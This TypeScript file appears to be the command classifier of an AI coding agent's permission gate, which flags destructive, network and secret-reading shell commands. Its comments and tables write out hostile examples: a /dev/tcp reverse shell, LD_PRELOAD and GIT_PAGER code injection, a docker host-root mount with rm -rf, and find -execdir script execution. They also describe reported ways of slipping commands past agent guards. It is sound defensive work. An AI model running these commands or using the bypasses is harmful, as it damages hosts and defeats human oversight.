function writesBlockDevice(segment: CommandSegment): boolean {
  // `dd` names its output with `of=`, which is why it reads that word rather
  // than the segment's arguments.
  if (segment.verb === "dd") {
    return segment.words.some((word) => word.startsWith("of=") && isBlockDevice(word.slice(3)))
  }
  return writesWhereVerbAims(segment, isBlockDevice)
}

function isBlockDevice(word: string): boolean {
  return BLOCK_DEVICE.test(resolveDotSegments(word))
}

/**
 * A `find` that removes what it matches, with no `rm` in the leading position
 * for a verb check to find. `-delete` is the obvious spelling and `-exec rm` is
 * the one that gets past a denylist keyed on `rm`, which is a reported bypass
 * against a shipped agent in the wild. CVE-2026-55743 is the same oversight one
 * layer down: the guard blocked `-exec` and `-ok` but not the functionally
 * identical `-execdir` and `-okdir`, so all four are covered here.
 *
 * An exec'd path is caught as well as an exec'd delete verb, because
 * `find . -execdir /tmp/run.sh {} ;` runs attacker-chosen code once per matched
 * file and names no delete verb at all. Every exec predicate is inspected, not
 * just the first: a benign `-exec echo` in front is a shield, not a verdict,
 * and `-exec rm` behind it deletes just the same.
 */
function findDeletes(segment: CommandSegment): boolean {
  if (segment.verb !== "find") return false
  if (segment.words.includes("-delete")) return true
  let flagIndex = segment.words.findIndex((word) => FIND_EXEC_FLAGS.has(word))
  while (flagIndex >= 0) {
    const executed = segment.words[flagIndex + 1]
    if (executed !== undefined) {
      const executedVerb = resolveBracketedWord(executed.split("/").pop() ?? executed)
      if (DELETE_VERBS.has(executedVerb)) return true
      if (executed.startsWith("/") || executed.startsWith("./") || SCRIPT_SUFFIX.test(executed))
        return true
    }
    const next = segment.words.slice(flagIndex + 2).findIndex((word) => FIND_EXEC_FLAGS.has(word))
    flagIndex = next < 0 ? -1 : flagIndex + 2 + next
  }
  return false
}

/** The `find` predicates that run a command per matched file. */
const FIND_EXEC_FLAGS = new Set(["-exec", "-execdir", "-ok", "-okdir"])

/** Verbs that remove a file, whichever of them `find` is told to run. */
const DELETE_VERBS = new Set(["rm", "rmdir", "shred", "unlink"])

/** A suffix that makes a word an executable script rather than an argument. */
const SCRIPT_SUFFIX = /\.(sh|bash|zsh|py|pl|rb|js|mjs|cjs|exe)$/

/**
 * Environment assignments that make an allowlisted binary run code the caller
 * chose. `LD_PRELOAD=/tmp/x.so git status` reads as the verb `git`, which is
 * ordinary, and then loads the shared object into it. The assignment is the
 * payload and the binary is only the carrier, so the verb check cannot see it.
 *
 * CVE-2026-55743 is exactly this shape: a shipped desktop agent stripped leading
 * `KEY=value` assignments before validating the command, so
 * `GIT_PAGER=/tmp/payload.sh git log` ran the payload through an allowlisted
 * `git`. Benign assignments stay allowed, and the published benign examples are
 * `TZ=UTC git log` and `NODE_ENV=production npm test`, which is why the variable
 * name has to be one that carries code and the value has to look executable.
 * `GIT_PAGER=cat` and `EDITOR=vim` are neither.
 */
const CODE_EXECUTION_ENV_VARS = new Set([
  "ld_preload",
  "ld_audit",
  "ld_library_path",
  "bash_env",
  "bash_func",
  "env",
  "shell",
  "pythonstartup",
  "pythonpath",
  "perl5opt",
  "rubyopt",
  "node_options",
  "git_pager",
  "git_editor",
  "git_sequence_editor",
  "git_external_diff",
  "git_ssh_command",
  "git_proxy_command",
  "git_hook_path",
  "git_config",
  "git_config_global",
  "git_config_system",
  "core.pager",
  "core.editor",
  "core.sshcommand",
  "core.hookspath",
  "core.fsmonitor",
  "core.askpass",
  "git_askpass",
  "git_template_dir",
  "ssh_askpass",
  "pager",
  "editor",
  "visual",
  "sequence.editor",
  "diff.external",
  "prompt_command",
  "lessopen",
  "lessclose",
  "java_tool_options",
  "jdk_java_options",
  "git_config_count",
])

/**
 * The numbered form of git's config injection, which needs no shell quoting and
 * no config file: `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager
 * GIT_CONFIG_VALUE_0=/tmp/x.sh git log`. The suffix is an index, so the names
 * cannot be listed and are matched instead.
 */
const NUMBERED_GIT_CONFIG = /^git_config_(key|value)_\d+$/

function hasCodeExecutionEnvAssignment(command: string, segments: CommandSegment[]): boolean {
  // An assignment cannot exist without one, and this runs on every shell command
  // the gate sees, so the cheap test comes before either scan.
  if (!command.includes("=")) return false
  if (segments.some((segment) => segment.words.some(isCodeExecutionAssignment))) return true
  // A second scan over the raw command, because the segment splitter breaks on a
  // pipe and a value can contain one. `LESSOPEN='|/tmp/x.sh %s' less file` is a
  // real spelling and its assignment lands in a segment of its own, halved.
  const lower = command.toLowerCase()
  // A pattern would have to name the variable and the value in one expression,
  // and the two classes overlap, so a token with no separator in it gets retried
  // at every length. That is super-linear on input this gate reads from a model.
  // Neither the name nor the value spans whitespace in the pattern this replaces,
  // so walking the tokens reads the same assignments in one pass each.
  return lower.split(/\s+/).some((token) => tokenCarriesCodeExecution(token))
}

/**
 * True when one whitespace-delimited token assigns a variable that runs code to a
 * value that could be loaded or executed.
 *
 * Quotes are not excluded from a name, so a quoted one arrives with its closing
 * quote attached and `"LESSOPEN"=/tmp/x.sh` read as a variable called `lessopen"`.
 * The segment scan strips quotes from whole words and catches the spellings it can
 * see, but this scan is the one that survives a pipe inside a value, so it strips
 * them too.
 */
function tokenCarriesCodeExecution(token: string): boolean {
  let from = 0
  for (;;) {
    const assignment = readRawAssignment(token, from)
    if (assignment === null) return false
    from = assignment.next
    const bare = assignment.name.replaceAll(/["'`]/g, "")
    if (!CODE_EXECUTION_ENV_VARS.has(bare) && !NUMBERED_GIT_CONFIG.test(bare)) continue
    if (looksExecutable(assignment.value.replaceAll(/["'`]/g, ""))) return true
  }
}

/** One assignment read out of a token, plus the index a search resumes at. */
type RawAssignment = { name: string; value: string; next: number }

/**
 * The next assignment in `token` at or after `from`, or null when it carries none.
 *
 * A name starts at the first letter or underscore the search reaches and runs to
 * the first `=` after it, which is what the pattern this replaced matched, and
 * which is why `--env=LESSOPEN=/tmp/x.sh` reads `env` as the name and everything
 * past it as the value. The value stops at a `;` for the same reason, and `next`
 * lands past it, so a token holding two assignments separated by a `;` yields
 * both, as the pattern did when it resumed at the end of a match.
 */
function readRawAssignment(token: string, from: number): RawAssignment | null {
  let nameStart = -1
  for (let index = from; index < token.length; index += 1) {
    const char = token[index]
    if (nameStart === -1 && ((char >= "a" && char <= "z") || char === "_")) {
      nameStart = index
      continue
    }
    if (char !== "=" || nameStart === -1) continue
    const rest = token.slice(index + 1)
    const terminator = rest.indexOf(";")
    const value = terminator === -1 ? rest : rest.slice(0, terminator)
    return { name: token.slice(nameStart, index), value, next: index + 1 + value.length }
  }
  return null
}

function isCodeExecutionAssignment(word: string): boolean {
  const separator = word.indexOf("=")
  if (separator <= 0) return false
  const name = word.slice(0, separator)
  if (!CODE_EXECUTION_ENV_VARS.has(name) && !NUMBERED_GIT_CONFIG.test(name)) return false
  return looksExecutable(word.slice(separator + 1))
}

/** True when an assigned value names a file that could be run or loaded. */
function looksExecutable(value: string): boolean {
  if (value.length === 0) return false
  if (value.startsWith("/") || value.startsWith("./") || value.startsWith("~/")) return true
  if (value.includes("/")) return true
  return SCRIPT_SUFFIX.test(value) || value.endsWith(".so") || value.endsWith(".dll")
}

/** A `shred` of anything. It overwrites a file so it cannot be recovered. */
function hasShred(segments: CommandSegment[]): boolean {
  return segments.some((segment) => segment.verb === "shred")
}

/** Container verbs that start a process, so a volume mount becomes a host write. */
const CONTAINER_RUN_SUBCOMMANDS: Record<string, Set<string>> = {
  docker: new Set(["run", "create", "exec"]),
  podman: new Set(["run", "create", "exec"]),
}

/** Host paths whose mount into a container defeats the worktree containment. */
const HOST_MOUNT_PATHS = ["/", "~", "/etc", "/home", "/root", "/var", "/usr", "/bin", "/dev"]

/**
 * True when a container is started with the host's own filesystem mounted in.
 * `docker run -v /:/host alpine rm -rf /host` runs an unrestricted delete on the
 * host through a path the gate never sees, and a container is a network rule for
 * its pull, which turbo allows, so the mount itself has to be the thing caught.
 */
function hasHostRootMount(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (!CONTAINER_RUN_SUBCOMMANDS[segment.verb]?.has(readSubcommand(segment))) return false
    return segment.words.some(isHostMountSpec)
  })
}

function isHostMountSpec(word: string): boolean {
  const host = mountHostOf(word)
  if (host === null || host.length === 0) return false
  return HOST_MOUNT_PATHS.some((path) => host === path || host.startsWith(`${path}/`))
}

/**
 * The host side of a bind mount in one word, or null when the word is not a
 * mount specification. All three spellings count: `-v /:/host` puts the spec in
 * the word after the flag, `--volume=/:/host` glues it on, and
 * `--mount=type=bind,source=/,target=/host` names it as a key.
 */
function mountHostOf(word: string): string | null {
  if (word.startsWith("--mount=")) {
    const source = word
      .slice("--mount=".length)
      .split(",")
      .find((part) => part.startsWith("source="))
    return source === undefined ? null : source.slice("source=".length)
  }
  if (word.startsWith("--volume=")) return word.slice("--volume=".length).split(":")[0] ?? null
  // `-v/:/host` glues the specification onto a short flag cluster, with no space
  // and no equals sign, so the cluster comes off before the host side is read.
  // Splitting on the colon first returned `-v/`, which matches no host path and
  // let the mount through.
  const spec = word.replace(/^-[a-z]*v[a-z]*/, "")
  const colon = spec.indexOf(":")
  return colon >= 0 ? spec.slice(0, colon) : null
}

function hasInitKill(segments: CommandSegment[]): boolean {
  return segments.some(
    (segment) =>
      (segment.verb === "kill" && segment.words.includes("1")) || segment.verb === "killall",
  )
}

/** Destructive patterns, checked in order. The first match names the rule. */
/**
 * Interpreters that take code on the command line, and the flags that carry it.
 *
 * A payload is where the shell rules stop seeing. `python -c "import os;
 * os.remove('/etc/hosts')"` names no shell verb, so the delete rules read an
 * ordinary command, and Agent mode allows that class. What the payload cannot hide
 * is the call it makes and the path it names, so both are read here instead. The
 * residual is stated rather than claimed away: a payload that reaches the same call
 * through a name built at runtime, `getattr(os, "rem" + "ove")`, still reads as
 * ordinary, and no amount of pattern work closes that.
 */
const INLINE_INTERPRETER_FLAGS: Record<string, Set<string>> = {
  python: new Set(["-c"]),
  python2: new Set(["-c"]),
  python3: new Set(["-c"]),
  node: new Set(["-e", "-p", "--eval", "--print"]),
  perl: new Set(["-e"]),
  ruby: new Set(["-e"]),
  php: new Set(["-r"]),
}

/** True when this segment hands code to an interpreter on the command line. */
function isInlineInterpreter(segment: CommandSegment): boolean {
  const flags = INLINE_INTERPRETER_FLAGS[segment.verb]
  if (flags === undefined) return false
  return segment.words.some((word) => flags.has(word))
}

/**
 * Filesystem calls that delete, overwrite or move what they name, in the case a
 * lowercased command carries.
 *
 * Read as substrings of the raw command rather than as words, because the segment
 * splitter breaks a payload on its parentheses and `os.remove('/etc/hosts')`
 * reaches the word list in pieces.
 */
const DESTRUCTIVE_INTERPRETER_CALLS = [
  "os.remove",
  "os.unlink",
  "os.rmdir",
  "os.removedirs",
  "os.rename",
  "os.replace",
  "os.truncate",
  "shutil.rmtree",
  "shutil.move",
  "shutil.copy",
  "rmsync",
  "unlinksync",
  "rmdirsync",
  "truncatesync",
  "renamesync",
  "writefilesync",
  "appendfilesync",
  "copyfilesync",
  "movesync",
  "fs.rm",
  "fs.unlink",
  "fs.rmdir",
  "fs.truncate",
  "fs.rename",
  "fs.writefile",
  "fs.copyfile",
  "promises.rm",
  "promises.unlink",
  "promises.rmdir",
  "promises.writefile",
  "file.delete",
  "file.unlink",
  "file.rename",
  "file.write",
  "fileutils.rm",
  "dir.delete",
  "unlink",
]

/**
 * Interpreter calls that copy or move a file.
 *
 * Such a call writes only the destination, so a payload whose calls are all in
 * this list is judged by the last named path alone. That is the shell rule for
 * the same verbs, where `cp /etc/passwd /tmp/x` and `mv /etc/hosts ./h.bak` are
 * not overwrites of the protected path. The critical-path breaker reads the
 * source of a payload separately, so moving the worktree still counts there.
 */
const COPY_MOVE_INTERPRETER_CALLS = [
  "shutil.copy",
  "copyfile",
  "copyfilesync",
  "shutil.move",
  "os.rename",
  "os.replace",
  "fs.rename",
  "file.rename",
  "renamesync",
  "movesync",
]

/** The mode literals that turn an interpreter `open` into a write rather than a read. */
const WRITE_MODE_LITERAL = /["'](w|a|x|r\+)(\+|b|t|\+b|\+t|bt|\+bt)?["']/

/**
 * Network calls an interpreter payload can make, which is what the egress rule
 * reads in place of a network verb on the command line.
 */
const INTERPRETER_NETWORK_CALLS = [
  "socket.create_connection",
  "socket.connect",
  "socket.socket",
  "urlopen",
  "urllib.request",
  "requests.",
  "httpx.",
  "http.client",
  "aiohttp",
  "fetch(",
  "http.request",
  "https.request",
  "http.get",
  "https.get",
  "axios",
  "net.connect",
  "net.createconnection",
  "dgram.create",
  "xmlhttprequest",
  "websocket",
  "net::http",
  "tcpsocket",
  "uri.open",
  "lwp::useragent",
  "io::socket",
  "http::tiny",
]

/**
 * A host a payload names. A dotted identifier is not enough on its own, because
 * every member access in a payload looks like one, so the name has to be quoted,
 * carry a scheme, or be an address.
 */
const PAYLOAD_HOST_LITERAL =
  /:\/\/|\b\d{1,3}(?:\.\d{1,3}){3}\b|["'`][a-z0-9-]+(?:\.[a-z0-9-]+)+["'`]/

/**
 * Every absolute or home-relative path a payload names, quoted or not.
 *
 * A bare `/` is kept, because the filesystem root is one character long and is the
 * one target the critical-path breaker cares about most. A bare `~` is not, since
 * no interpreter expands one in a string literal the way a shell expands it on a
 * command line.
 */
function payloadPaths(command: string): string[] {
  const found: string[] = []
  for (const match of command.matchAll(/(?:~\/|\/)[^\s'"`()|;,&<>]*/g)) {
    const raw = match[0]
    let end = raw.length
    while (end > 0 && (raw[end - 1] === "," || raw[end - 1] === "}" || raw[end - 1] === "]")) end--
    const path = raw.slice(0, end)
    if (path.length > 0) found.push(path)
  }
  return found
}

/**
 * True when a path is one the shell rules would refuse a write to. The protected
 * prefixes all end in a slash, so a recursive delete of `/etc` itself matches none
 * of them and is checked here as the root it is.
 */
function isProtectedTarget(path: string): boolean {
  if (isProtectedLocation(path)) return true
  return PROTECTED_WRITE_PREFIXES.includes(`${path}/`)
}

/**
 * True when an inline interpreter payload deletes or overwrites a protected path.
 *
 * `open` is left out of the call list because it reads as often as it writes, so it
 * counts only beside a mode literal that writes.
 */
function hasDestructiveInterpreterPayload(command: string, segments: CommandSegment[]): boolean {
  if (!segments.some(isInlineInterpreter)) return false
  const lower = command.toLowerCase()
  const calls = DESTRUCTIVE_INTERPRETER_CALLS.some((call) => lower.includes(call))
  const opensForWrite = lower.includes("open(") && WRITE_MODE_LITERAL.test(lower)
  if (!calls && !opensForWrite) return false
  const paths = payloadPaths(lower)
  // A copy or move writes only its destination, so a payload of nothing but
  // such calls is judged by the destinations it names. A delete or a write
  // mode in the same payload keeps every path in play.
  const copyMoveOnly =
    !opensForWrite &&
    COPY_MOVE_INTERPRETER_CALLS.some((call) => lower.includes(call)) &&
    !DESTRUCTIVE_INTERPRETER_CALLS.some(
      (call) => !COPY_MOVE_INTERPRETER_CALLS.includes(call) && lower.includes(call),
    )
  if (!copyMoveOnly) return paths.some(isProtectedTarget)
  // Every call writes the path it names, and a later call can hide an earlier
  // protected write, so the check reads the destination of each call. A call
  // whose arguments it cannot read falls back to every path the payload names.
  const destinations = copyMoveDestinations(lower)
  return (destinations ?? paths).some(isProtectedTarget)
}

/**
 * The destination each copy or move call in a payload names, or null when a
 * call names fewer than two quoted paths and the check cannot tell which
 * argument is the destination.
 *
 * The destination is the second quoted path because every call in the list
 * takes it second, source then destination, with optional trailing arguments
 * after it. A name is a call only when its own open paren follows it, which is
 * what keeps `shutil.copyfile` from reading as `shutil.copy` and a leftover.
 */
function copyMoveDestinations(payload: string): string[] | null {
  const starts: number[] = []
  for (const call of COPY_MOVE_INTERPRETER_CALLS) {
    let index = payload.indexOf(call)
    while (index !== -1) {
      if (payload[index + call.length] === "(") starts.push(index)
      index = payload.indexOf(call, index + 1)
    }
  }
  if (starts.length === 0) return null
  starts.sort((a, b) => a - b)
  const destinations: string[] = []
  for (let i = 0; i < starts.length; i++) {
    const end = i + 1 < starts.length ? starts[i + 1] : payload.length
    const quoted = payload.slice(starts[i] + 1, end).match(/"[^"]*"|'[^']*'/g) ?? []
    const destination = quoted[1]
    if (destination === undefined) return null
    destinations.push(destination.slice(1, -1))
  }
  return destinations
}

/** True when an inline interpreter payload opens a channel to a host it names. */
function hasInterpreterEgress(command: string, segments: CommandSegment[]): boolean {
  if (!segments.some(isInlineInterpreter)) return false
  const lower = command.toLowerCase()
  if (!INTERPRETER_NETWORK_CALLS.some((call) => lower.includes(call))) return false
  return PAYLOAD_HOST_LITERAL.test(lower)
}

/**
 * The calls that hand an argv list to a subprocess, where the verb is not a word
 * any rule can read.
 */
const SUBPROCESS_SPAWN_CALLS = [
  "subprocess.run",
  "subprocess.call",
  "subprocess.popen",
  "subprocess.check_call",
  "subprocess.check_output",
  "os.exec",
  "os.spawn",
  "os.posix_spawn",
  "pty.spawn",
  "child_process.spawn",
  "child_process.exec",
  "child_process.execfile",
  "execsync",
  "spawnsync",
]

/**
 * An inline interpreter payload's argv list flattened into the command line it
 * becomes, or null when the payload spawns nothing.
 *
 * `subprocess.run(['rm','-rf','/etc'])` has no whitespace between the verb and its
 * flags, so the splitter hands the rules one token and every word-reading rule
 * reads an ordinary command. The string form of the same call needs none of this,
 * because a shell string keeps its spaces and the verb arrives as a word.
 *
 * Flattening runs only when a spawn call is present. A payload that merely prints
 * a delete verb, `python -c "print('rm -rf /')"`, names no spawn and stays
 * ordinary, which is the same line the rules already draw for
 * `echo "do not run rm -rf /"`.
 */
function spawnedArgvCommand(command: string, segments: CommandSegment[]): string | null {
  if (!segments.some(isInlineInterpreter)) return null
  const lower = command.toLowerCase()
  if (!SUBPROCESS_SPAWN_CALLS.some((call) => lower.includes(call))) return null
  return lower.replaceAll(/["'`[\],]/g, " ")
}

/**
 * The verdict hidden in a spawned argv list, or null when it holds an ordinary
 * command. Destructive is read before network here for the reason the tables are
 * ordered that way at all, so a delete that also talks to a remote is named as the
 * delete.
 */
function spawnedArgvVerdict(command: string, segments: CommandSegment[]): ClassifiedAction | null {
  const spawned = spawnedArgvCommand(command, segments)
  if (spawned === null) return null
  const flattened = splitCommandSegments(spawned)
  return (
    firstMatch(DESTRUCTIVE_PATTERNS, spawned, flattened, "destructive") ??
    firstMatch(NETWORK_PATTERNS, spawned, flattened, "network")
  )
}

/**
 * The paths an inline interpreter payload deletes, which is what the critical-path
 * breaker reads when the payload names the worktree or a root instead of a
 * protected file.
 */
function interpreterDeleteTargets(command: string, segments: CommandSegment[]): string[] {
  if (!segments.some(isInlineInterpreter)) return []
  const lower = command.toLowerCase()
  if (!DESTRUCTIVE_INTERPRETER_CALLS.some((call) => lower.includes(call))) return []
  return payloadPaths(lower)
}

export const DESTRUCTIVE_PATTERNS: CommandPattern[] = [
  {
    id: "recursive-force-delete",
    test: (_command, segments) => hasRecursiveForceRm(segments),
    reason: "a recursive force delete removes files with no way to undo it",
  },
  {
    id: "bulk-find-delete",
    test: (_command, segments) => segments.some(findDeletes),
    reason: "a find that deletes or execs a delete removes every path it matches, with no undo",
  },
  {
    id: "env-injection",
    test: (command, segments) => hasCodeExecutionEnvAssignment(command, segments),
    reason:
      "an environment assignment makes the command that follows run code from a path this run chose",
  },
  {
    id: "shred",
    test: (_command, segments) => hasShred(segments),
    reason: "shred overwrites a file so its contents cannot be recovered",
  },
  {
    id: "destructive-sql",
    test: (command) => hasDestructiveSql(command),
    reason: "DROP or TRUNCATE destroys stored data",
  },
  {
    id: "forced-git-push",
    test: (_command, segments) => hasForcedGitPush(segments),
    reason: "a forced push rewrites history other people may have pulled",
  },
  {
    id: "discarding-git-command",
    test: (command, segments) =>
      hasDiscardingGitCommand(segments) || hasForcedBranchDelete(command),
    reason: "a hard reset, forced clean or history rewrite discards work",
  },
  {
    id: "protected-path-overwrite",
    test: (_command, segments) => hasProtectedRedirect(segments) || writesProtectedPath(segments),
    reason: "the command writes into a protected system directory",
  },
  {
    id: "interpreter-payload",
    test: (command, segments) => hasDestructiveInterpreterPayload(command, segments),
    reason:
      "an interpreter payload deletes or overwrites a protected path, with no shell verb on the line for the other rules to read",
  },
  {
    id: "disk-or-power",
    test: (_command, segments) => hasDiskOrPowerVerb(segments),
    reason: "the command reformats a device or changes machine power state",
  },
  {
    id: "host-root-mount",
    test: (_command, segments) => hasHostRootMount(segments),
    reason:
      "the command mounts the host filesystem into a container, which steps outside the worktree",
  },
  {
    id: "init-kill",
    test: (_command, segments) => hasInitKill(segments),
    reason: "the command kills the init process or every process with a name",
  },
]

/** A command the critical-path breaker caught, with the reason it shows. */
export interface CriticalPathBreach {
  /** Stable rule suffix. The evaluator emits `critical-path.<id>`. */
  id: string
  reason: string
}

/**
 * The critical-path breaker. Null means the command is ordinary.
 *
 * This runs above the allow-list and downgrades an allow to an ask, so no rule a
 * user writes can approve it. Claude Code holds the same line: an allow rule and
 * a hook that returns allow both fail to approve an `rm` or `rmdir` on a
 * critical path, and that stays true in its most permissive mode.
 *
 * `worktreeRoot` is optional because the classifier is pure and node-free. The
 * evaluator passes the run's worktree, which makes `rm -rf <worktree>` critical
 * too. Without it the lexical targets above still apply.
 */
export function criticalPathBreach(
  command: string,
  worktreeRoot?: string,
): CriticalPathBreach | null {
  const segments = splitCommandSegments(command)

  if (hasDiskOrPowerVerb(segments)) {
    return {
      id: "disk-or-power",
      reason: "the command reformats a device or changes machine power state",
    }
  }

  // A payload reaches the same filesystem calls with no delete verb on the line,
  // so the targets are read out of the raw command rather than out of a segment.
  for (const target of interpreterDeleteTargets(command, segments)) {
    const kind = criticalTargetKind(target, worktreeRoot)
    if (kind === null) continue
    return {
      id: "critical-delete",
      reason: `the command deletes ${kind}, and nothing recovers that`,
    }
  }

  // A spawned argv list is read flattened as well, so a delete of the worktree or
  // of a root through `subprocess.run` breaches the same way the shell spelling
  // does. This does not call back into the flattening, which would find a payload
  // in its own output and never stop.
  const spawned = spawnedArgvCommand(command, segments)
  const deleting = spawned === null ? segments : [...segments, ...splitCommandSegments(spawned)]

  for (const segment of deleting) {
    if (!segmentDeletes(segment)) continue
    // Every target, not just the first. `rm -rf /tmp/build /` names an ordinary
    // path before the filesystem root, and a scan that stopped at the first
    // candidate would let the root through.
    for (const target of deleteTargets(segment)) {
      const kind = criticalTargetKind(target, worktreeRoot)
      if (kind === null) continue
      return {
        id: "critical-delete",
        reason: `the command deletes ${kind}, and nothing recovers that`,
      }
    }
  }

  return null
}

/**
 * True when this segment deletes something the breaker should look at: `rm`,
 * `rmdir`, or a `find` carrying `-delete`.
 */
function segmentDeletes(segment: CommandSegment): boolean {
  if (segment.verb === "rm" || segment.verb === "rmdir") return true
  return findDeletes(segment)
}

/**
 * The candidate delete targets in one segment: every word that is not the verb,
 * not `sudo`, and not a flag. A delete can name several paths at once, so this
 * returns them all rather than the first one that happens to match.
 *
 * For a `find` the search root is the first non-flag word, and the remaining
 * words are predicates such as `-name` and their values, which are not paths.
 * They are harmless here because `criticalTargetKind` only answers for the exact
 * critical spellings and returns null for anything else.
 */
function deleteTargets(segment: CommandSegment): string[] {
  return segment.words.filter(
    (word) => word !== segment.verb && word !== "sudo" && !word.startsWith("-"),
  )
}

/**
 * Names a critical target in plain words rather than echoing the token, because
 * a reason is shown in the UI and this file's other reasons never quote command
 * text. Null means the target is ordinary and the mode's own verdict governs it.
 *
 * Words arrive lowercased from `splitCommandSegments`, so `$HOME` is compared as
 * `$home`. `.` and `..` count as critical because this repository has a real
 * incident on record where an empty path variable turned a cleanup call into a
 * delete of the parent directory, and `$PWD` and `${PWD}` are the working
 * directory by another name, so they count the way `.` does. A longer target
 * such as `./node_modules` is ordinary.
 */
function criticalTargetKind(target: string, worktreeRoot?: string): string | null {
  // `/work/mausCode/..` is the parent of the worktree and `/tmp/..` is the root,
  // so the target resolves before it is compared. A bare `..` stays what it is.
  target = resolveDotSegments(target)
  if (target === "/" || target === "/*") return "the filesystem root"
  if (target === "~" || target === "~/" || target === "$home" || target === "$home/") {
    return "the home directory"
  }
  if (
    target === "." ||
    target === "./" ||
    target === "$pwd" ||
    // biome-ignore lint/suspicious/noTemplateCurlyInString: the shell variable spelling, not an interpolation
    target === "${pwd}" ||
    target === "$pwd/" ||
    // biome-ignore lint/suspicious/noTemplateCurlyInString: the shell variable spelling, not an interpolation
    target === "${pwd}/"
  ) {
    return "the whole working directory"
  }
  if (target === ".." || target === "../") return "the parent of the working directory"
  if (worktreeRoot !== undefined) {
    const root = worktreeRoot.toLowerCase()
    if (target === root || target === `${root}/`) return "the whole worktree"
  }
  return null
}

function hasRemoteRsync(segment: CommandSegment): boolean {
  return segment.verb === "rsync" && segment.words.some(namesRemoteHost)
}

/**
 * True when a word names a remote rsync target.
 *
 * The documented remote spellings are `[user@]host:path` with the path either
 * absolute or host-relative, the daemon form `host::module`, and
 * `rsync://host/module`, and neither `@`, a scheme nor a dot is required, so
 * `server:/data` and `server:backup` are remote as well. A host that carries
 * a colon of its own is bracketed, as an IPv6 address is. The only local
 * spellings that keep a colon are a drive letter, which is one letter, and a
 * path, where a slash in the host part keeps the rule off a file that merely
 * contains a colon.
 */
function namesRemoteHost(word: string): boolean {
  if (word.includes("@") || word.includes("://")) return true
  if (word[0] === "[") {
    const close = word.indexOf("]", 1)
    if (close <= 1 || word[close + 1] !== ":") return false
    return true
  }
  const colon = word.indexOf(":")
  if (colon <= 0) return false
  const host = word.slice(0, colon)
  if (host.includes("/")) return false
  return host.length > 1
}

/**
 * git options that sit between `git` and the subcommand and take a separate
 * value. `git -C /repo push` read its subcommand as `-C` before this, which is
 * the bypass filed upstream against Claude Code: options inserted between the
 * command and the subcommand defeat a matcher that expects them adjacent.
 */
const SUBCOMMAND_VALUE_FLAGS = new Set(["-c", "--git-dir", "--work-tree", "--namespace"])

/** The subcommand of a `git` or package-manager segment, skipping global flags. */
function readSubcommand(segment: CommandSegment): string {
  for (let index = 1; index < segment.words.length; index += 1) {
    const word = segment.words[index]
    if (word === undefined) break
    if (word.startsWith("-")) {
      if (SUBCOMMAND_VALUE_FLAGS.has(word)) index += 1
      continue
    }
    return word
  }
  return ""
}

function segmentOpensNetwork(segment: CommandSegment): boolean {
  if (NETWORK_VERBS.has(segment.verb)) return true
  if (segment.verb === "git") return NETWORK_GIT_SUBCOMMANDS.has(readSubcommand(segment))
  if (hasRemoteRsync(segment)) return true
  if (opensSocketDevice(segment)) return true
  const bySubcommand = NETWORK_SUBCOMMAND_VERBS[segment.verb]
  if (bySubcommand?.has(readSubcommand(segment))) return true
  const publish = NETWORK_PUBLISH_SUBCOMMANDS[segment.verb]
  return publish ? publish.has(readSubcommand(segment)) : false
}

/**
 * True when the segment redirects through bash's pseudo-device socket, which is
 * a network connection with no network verb anywhere on the line.
 * `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` is the canonical reverse shell and is
 * a published detection indicator in its own right, so the spelling is matched
 * wherever it appears in a word rather than only after a redirect operator.
 */
function opensSocketDevice(segment: CommandSegment): boolean {
  return segment.words.some((word) => word.includes("/dev/tcp/") || word.includes("/dev/udp/"))
}

function hasNetworkVerb(segments: CommandSegment[]): boolean {
  return segments.some(segmentOpensNetwork)
}

/** Network patterns, checked in order. */
export const NETWORK_PATTERNS: CommandPattern[] = [
  {
    id: "egress-command",
    test: (_command, segments) => hasNetworkVerb(segments),
    reason: "the command opens a network channel out of this machine",
  },
  {
    id: "interpreter-egress",
    test: (command, segments) => hasInterpreterEgress(command, segments),
    reason:
      "an interpreter payload opens a channel to a host it names, with no network verb on the line for the other rule to read",
  },
]

/** What the classifier decided, and why. */
export interface ClassifiedAction {
  ruleClass: PermissionRuleClass
  /** Stable rule suffix. The evaluator emits `<class>.<ruleId>`. */
  ruleId: string
  /** One line for the user and the model. Names the pattern, never the command. */
  reason: string
}

/**
 * Classify one resolved tool call.
 *
 * Order matters and it is the order in the design record: exfiltration first,
 * because a secret leaving beats every other consideration; then destructive,
 * so `git push --force` reports as destructive rather than as the network call
 * it also is; then network; then the tool's own class. An unknown tool takes
 * `approval`, never `read-only`, because nobody has read its side effects.
 */
export function classifyToolAction(
  toolName: string,
  toolInput: Record<string, unknown>,
): ClassifiedAction {
  const secret = findSecretPath(toolInput)
  if (secret) {
    return {
      ruleClass: "exfiltration",
      ruleId: `secret-read.${secret.id}`,
      reason: `${toolName} targets ${secret.path}, which holds a secret`,
    }
  }

  const command = typeof toolInput.command === "string" ? toolInput.command : ""
  if (command.trim().length > 0) return classifyCommand(command)
  return classifyToolName(toolName)
}

/** Classify a shell command against the pattern tables, in table order. */
function classifyCommand(command: string): ClassifiedAction {
  const segments = splitCommandSegments(command)

  // A network verb is not required. The model's context is uploaded to the
  // provider by design, so a command that prints a secret has already moved it
  // off this machine by the time anything downstream could act, and the gate
  // cannot unsend a tool result. This is the same boundary the file-tool path
  // draws in `findSecretPath`, and requiring egress here would have left
  // `cat ~/.ssh/id_ed25519` in the approval class, which Agent mode allows.
  if (commandReadsSecret(segments)) {
    const egress = hasNetworkVerb(segments)
    return {
      ruleClass: "exfiltration",
      ruleId: egress ? "secret-egress" : "secret-command",
      reason: egress
        ? "the command sends a secret path over a network channel"
        : "the command names a secret location, so anything it prints enters the model's context",
    }
  }

  const destructive = firstMatch(DESTRUCTIVE_PATTERNS, command, segments, "destructive")
  if (destructive) return destructive

  // A payload that spawns an argv list hides its verb from every word-reading rule,
  // so the list is read as the command line it becomes. This sits after the
  // command's own destructive table and before its network table, which keeps a
  // delete ahead of an egress whichever of the two spellings carries it.
  const spawned = spawnedArgvVerdict(command, segments)
  if (spawned) return spawned

  const network = firstMatch(NETWORK_PATTERNS, command, segments, "network")
  if (network) return network

  return {
    ruleClass: "approval",
    ruleId: "shell-command",
    reason: "a shell command that matches no dangerous pattern",
  }
}

/** The first pattern that matches, or null when the command matches none. */
function firstMatch(
  patterns: CommandPattern[],
  command: string,
  segments: CommandSegment[],
  ruleClass: ClassifiedAction["ruleClass"],
): ClassifiedAction | null {
  for (const pattern of patterns) {
    if (pattern.test(command, segments)) {
